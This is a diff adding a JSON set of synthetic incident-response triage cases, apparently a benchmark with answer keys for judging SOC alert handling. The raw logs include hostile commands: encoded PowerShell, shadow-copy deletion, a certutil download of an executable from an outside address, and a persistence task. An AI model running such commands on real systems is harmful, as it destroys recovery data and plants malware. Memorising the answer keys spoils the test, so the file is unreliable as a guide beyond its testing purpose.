@@ -1,0 +1,223 @@
+[
+  {
+    "case_id": "IR-0001",
+    "title": "Phishing attachment launched PowerShell",
+    "description": "A finance user opened a malicious attachment that launched encoded PowerShell and contacted an external host.",
+    "context": "Finance workstation FIN-WS-044, Windows 11, user j.smith",
+    "alerts": [
+      {
+        "alert_id": "EDR-1001",
+        "timestamp": "2026-05-12T08:42:11Z",
+        "rule_name": "Office spawning PowerShell",
+        "original_severity": "high",
+        "source_ip": "10.20.4.44",
+        "dest_ip": "198.51.100.24",
+        "raw_log": "host=FIN-WS-044 user=j.smith parent=WINWORD.EXE process=powershell.exe command=\"powershell -enc SQBFAFgA\" dst=198.51.100.24:443"
+      }
+    ],
+    "expected": {
+      "decision": "true_positive",
+      "severity": "high",
+      "techniques": ["T1566.001", "T1059.001"],
+      "required_findings": ["malicious attachment", "encoded PowerShell"],
+      "required_actions": ["Isolate FIN-WS-044", "Reset j.smith credentials"]
+    }
+  },
+  {
+    "case_id": "IR-0002",
+    "title": "Credential dumping followed by lateral movement",
+    "description": "An endpoint attempted to dump LSASS memory before authenticating to a file server with an administrative account.",
+    "context": "Engineering workstation ENG-WS-017 and file server FILE-02",
+    "alerts": [
+      {
+        "alert_id": "EDR-2001",
+        "timestamp": "2026-05-13T02:14:02Z",
+        "rule_name": "LSASS memory access",
+        "original_severity": "critical",
+        "source_ip": "10.30.8.17",
+        "raw_log": "host=ENG-WS-017 process=rundll32.exe target_process=lsass.exe access_mask=0x1010 user=svc_backup"
+      },
+      {
+        "alert_id": "AUTH-2002",
+        "timestamp": "2026-05-13T02:19:40Z",
+        "rule_name": "Admin logon from workstation",
+        "original_severity": "high",
+        "source_ip": "10.30.8.17",
+        "dest_ip": "10.30.1.22",
+        "raw_log": "event_id=4624 host=FILE-02 source=ENG-WS-017 account=svc_backup logon_type=3 auth=NTLM"
+      }
+    ],
+    "expected": {
+      "decision": "true_positive",
+      "severity": "critical",
+      "techniques": ["T1003.001", "T1021.002"],
+      "required_findings": ["LSASS memory", "lateral movement"],
+      "required_actions": ["Isolate ENG-WS-017", "Disable svc_backup"]
+    }
+  },
+  {
+    "case_id": "IR-0003",
+    "title": "Ransomware encryption activity",
+    "description": "A server created a ransom note and rapidly modified hundreds of documents after deleting shadow copies.",
+    "context": "Shared file server FILE-07",
+    "alerts": [
+      {
+        "alert_id": "EDR-3001",
+        "timestamp": "2026-05-14T16:31:22Z",
+        "rule_name": "Shadow copy deletion",
+        "original_severity": "critical",
+        "source_ip": "10.40.1.7",
+        "raw_log": "host=FILE-07 process=vssadmin.exe command=\"vssadmin delete shadows /all /quiet\" user=administrator"
+      },
+      {
+        "alert_id": "FIM-3002",
+        "timestamp": "2026-05-14T16:34:09Z",
+        "rule_name": "Mass file modification",
+        "original_severity": "critical",
+        "source_ip": "10.40.1.7",
+        "raw_log": "host=FILE-07 modified_files=1842 extension=.locked created=README_RESTORE_FILES.txt interval_seconds=90"
+      }
+    ],
+    "expected": {
+      "decision": "true_positive",
+      "severity": "critical",
+      "techniques": ["T1490", "T1486"],
+      "required_findings": ["shadow copies", "ransom note"],
+      "required_actions": ["Isolate FILE-07", "Activate ransomware response plan"]
+    }
+  },
+  {
+    "case_id": "IR-0004",
+    "title": "Suspicious cloud administrator creation",
+    "description": "A new privileged cloud user and access key were created from a previously unseen address without an approved change.",
+    "context": "Production AWS account 123456789012",
+    "alerts": [
+      {
+        "alert_id": "AWS-4001",
+        "timestamp": "2026-05-15T23:03:18Z",
+        "rule_name": "Privileged IAM user created",
+        "original_severity": "high",
+        "source_ip": "203.0.113.77",
+        "raw_log": "eventSource=iam.amazonaws.com eventName=CreateUser userIdentity=ops-admin sourceIPAddress=203.0.113.77 request.userName=backup-admin"
+      },
+      {
+        "alert_id": "AWS-4002",
+        "timestamp": "2026-05-15T23:04:01Z",
+        "rule_name": "Access key created",
+        "original_severity": "high",
+        "source_ip": "203.0.113.77",
+        "raw_log": "eventSource=iam.amazonaws.com eventName=CreateAccessKey userIdentity=ops-admin request.userName=backup-admin"
+      }
+    ],
+    "expected": {
+      "decision": "needs_investigation",
+      "severity": "high",
+      "techniques": ["T1136.003", "T1098.001"],
+      "required_findings": ["privileged cloud user", "access key"],
+      "required_actions": ["Validate the change with ops-admin", "Disable backup-admin pending validation"]
+    }
+  },
+  {
+    "case_id": "IR-0005",
+    "title": "Authorized vulnerability scanner",
+    "description": "An approved scanner performed a scheduled internal network assessment.",
+    "context": "Approved weekly scan from scanner VA-SCAN-01",
+    "alerts": [
+      {
+        "alert_id": "NDR-5001",
+        "timestamp": "2026-05-16T01:00:00Z",
+        "rule_name": "Horizontal port scan",
+        "original_severity": "medium",
+        "source_ip": "10.50.0.10",
+        "raw_log": "src=10.50.0.10 host=VA-SCAN-01 destinations=10.50.1.0/24 ports=22,80,443,445 schedule_id=CHG-8842"
+      }
+    ],
+    "expected": {
+      "decision": "false_positive",
+      "severity": "info",
+      "techniques": ["T1046"],
+      "required_findings": ["approved scanner", "CHG-8842"],
+      "required_actions": ["Close as authorized activity"]
+    }
+  },
+  {
+    "case_id": "IR-0006",
+    "title": "Authorized remote administration",
+    "description": "A system administrator used the approved management platform to execute a maintenance script.",
+    "context": "Approved maintenance window CHG-9011",
+    "alerts": [
+      {
+        "alert_id": "EDR-6001",
+        "timestamp": "2026-05-17T20:15:00Z",
+        "rule_name": "Remote PowerShell execution",
+        "original_severity": "medium",
+        "source_ip": "10.60.0.20",
+        "dest_ip": "10.60.1.50",
+        "raw_log": "host=APP-05 user=corp\\a.admin parent=ccmexec.exe process=powershell.exe script=install_security_update.ps1 change=CHG-9011"
+      }
+    ],
+    "expected": {
+      "decision": "false_positive",
+      "severity": "info",
+      "techniques": ["T1059.001"],
+      "required_findings": ["approved maintenance", "CHG-9011"],
+      "required_actions": ["Close as authorized activity"]
+    }
+  },
+  {
+    "case_id": "IR-0007",
+    "title": "Web shell on public application server",
+    "description": "A public web server spawned a command shell that downloaded tooling and established persistence.",
+    "context": "Internet-facing application server WEB-03",
+    "alerts": [
+      {
+        "alert_id": "EDR-7001",
+        "timestamp": "2026-05-18T11:09:31Z",
+        "rule_name": "Web server spawned shell",
+        "original_severity": "critical",
+        "source_ip": "192.0.2.55",
+        "dest_ip": "10.70.2.13",
+        "raw_log": "host=WEB-03 parent=w3wp.exe process=cmd.exe command=\"certutil -urlcache -f http://192.0.2.55/a.exe C:\\ProgramData\\a.exe\""
+      },
+      {
+        "alert_id": "EDR-7002",
+        "timestamp": "2026-05-18T11:11:02Z",
+        "rule_name": "Scheduled task created",
+        "original_severity": "high",
+        "source_ip": "10.70.2.13",
+        "raw_log": "host=WEB-03 process=schtasks.exe command=\"schtasks /create /tn UpdateCheck /tr C:\\ProgramData\\a.exe /sc minute /mo 15\""
+      }
+    ],
+    "expected": {
+      "decision": "true_positive",
+      "severity": "critical",
+      "techniques": ["T1505.003", "T1105", "T1053.005"],
+      "required_findings": ["web shell", "scheduled task"],
+      "required_actions": ["Isolate WEB-03", "Preserve forensic evidence"]
+    }
+  },
+  {
+    "case_id": "IR-0008",
+    "title": "Possible DNS tunneling",
+    "description": "A workstation generated long, high-entropy DNS queries at a regular cadence, but no endpoint evidence is available.",
+    "context": "Marketing workstation MKT-WS-028",
+    "alerts": [
+      {
+        "alert_id": "DNS-8001",
+        "timestamp": "2026-05-19T09:20:00Z",
+        "rule_name": "Possible DNS tunneling",
+        "original_severity": "medium",
+        "source_ip": "10.80.4.28",
+        "dest_ip": "10.80.0.53",
+        "raw_log": "client=MKT-WS-028 query_count=640 avg_label_length=58 entropy=4.72 domain=telemetry-example.net interval=60s"
+      }
+    ],
+    "expected": {
+      "decision": "needs_investigation",
+      "severity": "medium",
+      "techniques": ["T1071.004"],
+      "required_findings": ["high-entropy DNS queries", "regular cadence"],
+      "required_actions": ["Collect endpoint telemetry from MKT-WS-028", "Review DNS query payloads"]
+    }
+  }
+]
